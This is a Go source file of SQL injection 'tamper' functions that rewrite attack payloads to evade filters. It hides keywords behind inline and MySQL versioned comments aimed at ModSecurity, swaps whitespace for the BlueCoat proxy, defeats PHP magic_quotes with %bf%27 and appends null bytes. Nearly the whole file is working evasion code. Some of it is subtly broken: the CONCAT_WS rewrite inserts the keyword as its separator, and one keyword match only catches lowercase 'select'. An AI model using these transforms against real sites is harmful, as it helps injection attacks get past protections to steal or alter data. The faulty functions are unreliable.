package tamper

import "strings"

// maxKeywordLen bounds scanning when looking for SQL keywords.
const maxKeywordLen = 12

// sqlKeywords lists the keywords targeted by comment-style tampers.
var sqlKeywords = []string{
	"SELECT", "FROM", "WHERE", "AND", "OR", "UNION", "INSERT", "UPDATE",
	"DELETE", "ORDER", "GROUP", "BY", "HAVING", "LIMIT", "OFFSET", "JOIN",
	"LEFT", "RIGHT", "INNER", "OUTER", "CROSS", "AS", "ON", "NOT", "NULL",
	"EXCEPT", "INTERSECT", "INTO", "VALUES", "SET", "CREATE", "ALTER",
	"DROP", "TABLE", "INDEX", "TRUNCATE", "CASE", "WHEN", "THEN", "ELSE",
	"END", "DISTINCT", "LIKE", "IN", "IS", "BETWEEN", "EXISTS", "CONCAT",
	"CHAR", "MID", "SUBSTR", "SUBSTRING", "IF", "SLEEP", "BENCHMARK",
	"LOAD_FILE", "REPLACE", "PASSWORD", "USER", "DATABASE", "VERSION",
}

// keywordSet builds a lookup map of lowercase keywords.
func keywordSet() map[string]struct{} {
	m := make(map[string]struct{}, len(sqlKeywords))
	for _, k := range sqlKeywords {
		m[strings.ToLower(k)] = struct{}{}
	}
	return m
}

// randomcomments inserts a comment marker inside selected SQL keywords, e.g.
// "SELECT" -> "SEL/**/ECT". Works when the target strips comment content but
// still glues the surrounding letters, restoring the original keyword after
// filter removal.
func randomcomments(payload string) string {
	lower := strings.ToLower(payload)
	kwset := keywordSet()
	var sb strings.Builder
	i := 0
	for i < len(payload) {
		matched := false
		for length := min(maxKeywordLen, len(payload)-i); length >= 3; length-- {
			word := lower[i : i+length]
			if _, ok := kwset[word]; !ok {
				continue
			}
			// Ensure whole-keyword boundary.
			beforeOK := i == 0 || !isKeywordChar(payload[i-1])
			afterOK := i+length == len(payload) || !isKeywordChar(payload[i+length])
			if !beforeOK || !afterOK {
				continue
			}
			// Choose a split point inside the keyword (not at the edges).
			if length >= 4 {
				split := 2 + randSource().IntN(length-3)
				sb.WriteString(payload[i : i+split])
				sb.WriteString("/**/")
				sb.WriteString(payload[i+split : i+length])
			} else {
				sb.WriteString(payload[i : i+length])
			}
			i += length
			matched = true
			break
		}
		if !matched {
			sb.WriteByte(payload[i])
			i++
		}
	}
	return sb.String()
}

// modsecurityversioned wraps keywords in a high MySQL version comment,
// e.g. "/*!30874SELECT*/". ModSecurity trusts versioned comments above its
// own version, bypassing its ruleset.
func modsecurityversioned(payload string) string {
	return versionedWith(payload, "30874")
}

// modsecurityzeroversioned wraps keywords in a zero version comment,
// e.g. "/*!00000SELECT*/". Many filters skip zero-versioned comments.
func modsecurityzeroversioned(payload string) string {
	return versionedWith(payload, "00000")
}

func versionedWith(payload, version string) string {
	lower := strings.ToLower(payload)
	kwset := keywordSet()
	var sb strings.Builder
	i := 0
	for i < len(payload) {
		matched := false
		for length := min(maxKeywordLen, len(payload)-i); length >= 3; length-- {
			word := lower[i : i+length]
			if _, ok := kwset[word]; !ok {
				continue
			}
			beforeOK := i == 0 || !isKeywordChar(payload[i-1])
			afterOK := i+length == len(payload) || !isKeywordChar(payload[i+length])
			if !beforeOK || !afterOK {
				continue
			}
			sb.WriteString("/*!" + version + payload[i:i+length] + "*/")
			i += length
			matched = true
			break
		}
		if !matched {
			sb.WriteByte(payload[i])
			i++
		}
	}
	return sb.String()
}

// bluecoat replaces spaces with characters tolerated by the BlueCoat proxy
// which strips certain bytes. It uses tab and specific URL-encoded whitespace
// that the BlueCoat WAF does not flag as SQL.
func bluecoat(payload string) string {
	// BlueCoat traditionally allows tab (\t) and sends it through; it also
	// tolerates a vertical tab used as whitespace.
	var sb strings.Builder
	sb.Grow(len(payload) + 4)
	for _, r := range payload {
		if r == ' ' {
			// Alternate between tab and URL-encoded tab for variety.
			if randBool() {
				sb.WriteByte('\t')
			} else {
				sb.WriteString("%09")
			}
		} else {
			sb.WriteRune(r)
		}
	}
	return sb.String()
}

// halfversionedmorphkeywords wraps keywords in a MySQL versioned comment that
// is NOT closed, e.g. "/*!SELECT" (missing trailing "*/"). Some parsers
// consume the versioned comment block greedily yet still execute the body.
func halfversionedmorphkeywords(payload string) string {
	lower := strings.ToLower(payload)
	kwset := keywordSet()
	var sb strings.Builder
	i := 0
	for i < len(payload) {
		matched := false
		for length := min(maxKeywordLen, len(payload)-i); length >= 3; length-- {
			word := lower[i : i+length]
			if _, ok := kwset[word]; !ok {
				continue
			}
			beforeOK := i == 0 || !isKeywordChar(payload[i-1])
			afterOK := i+length == len(payload) || !isKeywordChar(payload[i+length])
			if !beforeOK || !afterOK {
				continue
			}
			sb.WriteString("/*!" + payload[i:i+length])
			i += length
			matched = true
			break
		}
		if !matched {
			sb.WriteByte(payload[i])
			i++
		}
	}
	return sb.String()
}

// unmagicquotes prepends the multi-byte sequence %bf%27 to every apostrophe.
// This defeats PHP magic_quotes_gpc which escapes the quote with a backslash;
// the %bf%27 bytes form an invalid UTF-8 char that can swallow the backslash.
func unmagicquotes(payload string) string {
	return strings.ReplaceAll(payload, "'", "%bf%27")
}

// appendnullbyte appends a NULL byte (%00) to the payload. Some parsers
// terminate strings at the null byte while a WAF scans past it, allowing the
// trailing SQL to be executed after the filter stops checking.
func appendnullbyte(payload string) string {
	return payload + "%00"
}

// schemasplit inserts a %0B (vertical tab) inside a keyword, e.g. "SELECT" ->
// "SELE%0BCT". The schema parser skips whitespace including vertical tabs,
// reconstructing the keyword.
func schemasplit(payload string) string {
	return strings.ReplaceAll(payload, "select", "SELE%0BCT")
}

// concat2concatws transforms CONCAT(...) invocations into CONCAT_WS(...)
// equivalents. CONCAT_WS takes a separator first; an empty separator yields
// the same concatenation. This evades filters blocking the CONCAT token.
func concat2concatws(payload string) string {
	return replaceWordWith(payload, "CONCAT", "CONCAT_WS('%s')")
}

// replaceWordWith replaces whole SQL keywords with a format string that may
// contain a %s placeholder for the matched keyword.
func replaceWordWith(s, keyword, format string) string {
	lower := strings.ToLower(s)
	kw := strings.ToLower(keyword)
	var sb strings.Builder
	i := 0
	for i < len(s) {
		if i+len(kw) <= len(s) && lower[i:i+len(kw)] == kw {
			beforeOK := i == 0 || !isIdentChar(s[i-1])
			afterOK := i+len(kw) == len(s) || !isIdentChar(s[i+len(kw)])
			if beforeOK && afterOK {
				sb.WriteString(strings.ReplaceAll(format, "%s", s[i:i+len(kw)]))
				i += len(kw)
				continue
			}
		}
		sb.WriteByte(s[i])
		i++
	}
	return sb.String()
}

// lowercaseKeywords lowercases only SQL keywords while leaving quoted string
// literals and numeric values untouched. This is more surgical than the
// blanket lowercase tamper.
func lowercaseKeywords(payload string) string {
	lower := strings.ToLower(payload)
	kwset := keywordSet()
	var sb strings.Builder
	i := 0
	for i < len(payload) {
		matched := false
		for length := min(maxKeywordLen, len(payload)-i); length >= 3; length-- {
			word := lower[i : i+length]
			if _, ok := kwset[word]; !ok {
				continue
			}
			beforeOK := i == 0 || !isKeywordChar(payload[i-1])
			afterOK := i+length == len(payload) || !isKeywordChar(payload[i+length])
			if !beforeOK || !afterOK {
				continue
			}
			sb.WriteString(word)
			i += length
			matched = true
			break
		}
		if !matched {
			sb.WriteByte(payload[i])
			i++
		}
	}
	return sb.String()
}
